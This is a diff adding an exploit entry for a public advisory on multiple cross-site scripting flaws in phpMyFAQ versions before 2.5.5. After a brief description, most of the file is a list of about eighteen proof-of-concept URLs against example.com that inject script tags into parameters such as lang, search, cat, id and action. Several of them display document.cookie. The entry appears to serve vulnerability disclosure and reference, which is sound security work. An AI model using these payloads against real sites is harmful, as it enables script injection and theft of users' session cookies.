@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/37180/info
+
+phpMyFAQ is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Versions prior to phpMyFAQ 2.5.5 are vulnerable. 
+
+http://www.example.com/index.php?action=sitemap&lang=en"><script>alert(1)</script>
+http://www.example.com/index.php?search=hello"><script>alert(document.cookie)</script>&action=search
+http://www.example.com/index.php?action=artikel&cat=1&id=1&artlang=en&highlight=you"><script>alert(1)</script>
+http://www.example.com/index.php?action=artikel&cat=1&id=1&artlang=en"><script>alert(1)</script>
+http://www.example.com/index.php?action=sitemap&letter=W&lang=en"><script>alert(1)</script>
+http://www.example.com/index.php?action=sitemap&letter=W"><script>alert(1)</script>&lang=en
+http://www.example.com/index.php?sid=7&lang=en"><script>alert(document.cookie)</script>&action=show&cat=1
+http://www.example.com/index.php?sid=7&lang=en&action=show&cat=1"><script>alert(document.cookie)</script>
+http://www.example.com/index.php?action=search&tagging_id=1"><script>alert(1)</script>
+http://www.example.com/index.php?action=news&newsid=1&newslang=en"><script>alert(document.cookie)</script>
+http://www.example.com/index.php?action=send2friend&cat=1&id=1&artlang=en"><script>alert(1)</script>
+http://www.example.com/index.php?action=send2friend&cat=1"><script>alert(1)</script>&id=1&artlang=en
+http://www.example.com/index.php?action=send2friend&cat=1&id=1"><script>alert(1)</script>&artlang=en
+http://www.example.com/index.php?action=translate&cat=1&id=1&srclang=en"><script>alert(1)</script>
+http://www.example.com/index.php?action=translate&cat=1&id=1"><script>alert(1)</script>&srclang=en
+http://www.example.com/index.php?action=translate&cat=1"><script>alert(1)</script>&id=1&srclang=en
+http://www.example.com/index.php?action=add&question=1&cat=1"><script>alert(1)</script>
+http://www.example.com/index.php?action=add&question=1"><script>alert(1)</script>&cat=1 
